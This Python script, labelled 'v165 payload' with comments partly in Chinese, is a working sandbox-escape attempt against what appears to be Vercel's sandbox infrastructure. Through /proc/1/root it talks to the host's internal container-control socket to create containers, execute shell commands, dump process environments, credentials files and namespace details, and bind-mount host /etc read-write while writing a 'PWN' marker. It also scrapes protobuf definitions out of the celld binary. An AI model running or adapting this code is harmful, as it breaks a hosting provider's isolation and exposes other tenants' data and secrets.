# -*- coding: utf-8 -*-
"""v165 payload: yes 长命容器进程 + 容器 rootfs 视角 + StreamOutput 抓输出 + Mount 重测
输出 /vercel/sandbox/v165c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v165c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def raw_grpc_stream(sockpath, path, msg, t=6.0, wait=3.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        body = b'\x00' + struct.pack('>I', len(msg)) + msg
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
               'TE: trailers\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        t0 = time.time()
        try:
            while time.time() - t0 < wait:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        gs = re.search(rb'grpc-status: (\d+)', d)
        return st, d[hdr_end + 4:] if hdr_end > 0 else b'', gs.group(1).decode() if gs else ''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b'', ''


def fstr(field_no, s):
    return bytes([field_no << 3 | 2]) + bytes([len(s)]) + s.encode()


def fmsg(field_no, inner):
    return bytes([field_no << 3 | 2]) + bytes([len(inner)]) + inner


def fvarint(field_no, v):
    out = bytes([field_no << 3])
    while v >= 128:
        out += bytes([(v & 127) | 128])
        v >>= 7
    return out + bytes([v])


def find_proc(comm_list, cmd_hint=None):
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in comm_list:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:150].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                if cmd_hint and cmd_hint not in cl:
                    continue
                return d, comm, cl
    return None


def exec_json(cid, cmd_str, tag, t=8):
    body = json.dumps({'container_id': cid,
                       'process': {'command': '/bin/sh', 'arguments': ['-c', cmd_str]}}).encode()
    st, pay = raw_req(CELL, '%s/Exec' % CTRS, body, t=t)
    log('%s Exec -> %s %r' % (tag, st, pay[:200]))
    return st, pay


# ============ 1: Create cmd=yes + Start ============
log('=== 1 create yes ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
log('Create yes -> %s %r' % (st, pay[:200]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:200]))
    time.sleep(1)
    # 找 yes 进程
    found = find_proc(['yes'])
    if found:
        pid, comm, cl = found
        log('!!! YES pid=%s cmd=%s' % (pid, cl))
        # ===== 容器 rootfs 视角 =====
        try:
            for e in sorted(os.listdir('/proc/%s/root' % pid))[:40]:
                log('R /%s' % e)
        except Exception as e:
            log('R EXC %s' % e)
        try:
            for ln in open('/proc/%s/mountinfo' % pid).read().splitlines()[:35]:
                log('MI %s' % ln[:220])
        except Exception as e:
            log('MI EXC %s' % e)
        try:
            stt = open('/proc/%s/status' % pid).read()
            for ln in stt.splitlines():
                if ln.startswith(('CapEff:', 'CapBnd:', 'Seccomp:', 'NoNewPrivs:', 'Uid:', 'Gid:', 'NSpid:', 'PPid:')):
                    log('ST %s' % ln)
        except Exception as e:
            log('ST EXC %s' % e)
        try:
            env = open('/proc/%s/environ' % pid).read().replace('\x00', '\n')
            log('ENV %s' % env[:1200])
        except Exception as e:
            log('ENV EXC %s' % e)
        try:
            log('CWD %s' % os.readlink('/proc/%s/cwd' % pid))
        except Exception as e:
            log('CWD EXC %s' % e)
        try:
            for ns in ['pid', 'mnt', 'net', 'uts', 'ipc', 'user']:
                log('NS %s %s' % (ns, os.readlink('/proc/%s/ns/%s' % (pid, ns))))
        except Exception as e:
            log('NS EXC %s' % e)
        try:
            log('CG %s' % open('/proc/%s/cgroup' % pid).read()[:400])
        except Exception as e:
            log('CG EXC %s' % e)
    else:
        log('NO yes proc!')
        for d in sorted(os.listdir(R + '/run/cell/runc')):
            log('runc dir %s' % d)

# ============ 2: Exec 在容器内写文件 + 找 sh ============
log('=== 2 exec+find ===')
if cid:
    exec_json(cid, 'id > /tmp/v165id; env >> /tmp/v165env; sleep 300', 'write')
    time.sleep(1)
    found = find_proc(['sh'], 'sleep 300')
    if found:
        pid, comm, cl = found
        log('!!! SH pid=%s cmd=%s' % (pid, cl[:120]))
        # 容器 rootfs 里的文件
        for p in ['/proc/%s/root/tmp/v165id' % pid, '/proc/%s/root/tmp/v165env' % pid]:
            try:
                d = open(p).read()
                log('CF %s=%r' % (p, d[:600]))
            except Exception as e:
                log('CF %s ERR %s' % (p, type(e).__name__))
        # 容器 etc/passwd
        for p in ['/proc/%s/root/etc/passwd' % pid, '/proc/%s/root/etc/hostname' % pid,
                  '/proc/%s/root/etc/resolv.conf' % pid]:
            try:
                d = open(p).read()
                log('CF2 %s=%r' % (p, d[:500]))
            except Exception as e:
                log('CF2 %s ERR' % p)
        # 容器 proc 列表 (pid ns 视角)
        try:
            for e in sorted(os.listdir('/proc/%s/root/proc' % pid))[:10]:
                log('CTRP /proc/%s' % e)
        except Exception as e:
            log('CTRP EXC %s' % e)

# ============ 3: StreamOutput 抓 yes 输出 ============
log('=== 3 stream ===')
if cid:
    for sv in [0, 1, 2]:
        req = fstr(1, cid) + fvarint(2, sv)
        st3, pay3, gs3 = raw_grpc_stream(CELL, '%s/StreamOutput' % CTRS, req, wait=2.5)
        log('StreamOutput s=%d -> %s gs=%s len=%d body=%r' % (sv, st3, gs3, len(pay3), pay3[:200]))

# ============ 4: Mount 在运行容器上 ============
log('=== 4 mount live ===')
if cid:
    # 先 mkdir 目标
    exec_json(cid, 'mkdir -p /tmp/v165mnt; ls -la /tmp/', 'mkdir')
    time.sleep(0.5)
    for mnt in [{'bind': {'source': '/tmp', 'destination': '/tmp/v165mnt', 'mode': 'MOUNT_MODE_READ_WRITE'}},
                {'bind': {'source': '/etc', 'destination': '/tmp/v165mnt', 'mode': 'MOUNT_MODE_READ_WRITE'}},
                {'tmpfs': {'destination': '/tmp/v165mnt', 'mode': 'MOUNT_MODE_READ_WRITE'}}]:
        st4, pay4 = raw_req(CELL, '%s/Mount' % CTRS,
                            json.dumps({'container_id': cid, 'mounts': [mnt]}).encode(), t=5)
        mm = re.search(rb'"message":"([^"]+)"', pay4)
        msg = mm.group(1).decode(errors='replace') if mm else pay4[:150].decode(errors='replace')
        log('Mount %r -> %s %s' % (mnt, st4, msg))
        if '200' in st4:
            log('  OK! %r' % mnt)
            exec_json(cid, 'ls -la /tmp/v165mnt/ | head; echo MNT_TEST > /tmp/v165mnt/PWN', 'verify')
            time.sleep(0.5)

# ============ 5: MountTypeDrive 完整 descriptor ============
log('=== 5 drive proto ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    idx = data.find(b'types/mount.proto')
    log('mount.proto at 0x%x' % idx)
    # 直接找 Mount 消息 + MountTypeDrive 的 descriptor 区域
    i2 = data.find(b'MountTypeDrive', idx)
    if i2 < 0:
        i2 = data.find(b'MountTypeDrive')
    log('MountTypeDrive ref at 0x%x' % i2)
    # 找 descriptor 中的 MountTypeDrive 定义 (附近有 Source/Destination)
    i3 = data.find(b'\n\x0eMountTypeDrive', idx)
    log('MountTypeDrive def at 0x%x' % i3)
    if i3 > 0:
        seg = data[i3:i3 + 800]
        log('DRV %r' % seg)
except Exception as e:
    log('DRV EXC %s' % e)

log('V165_DONE')
f.close()
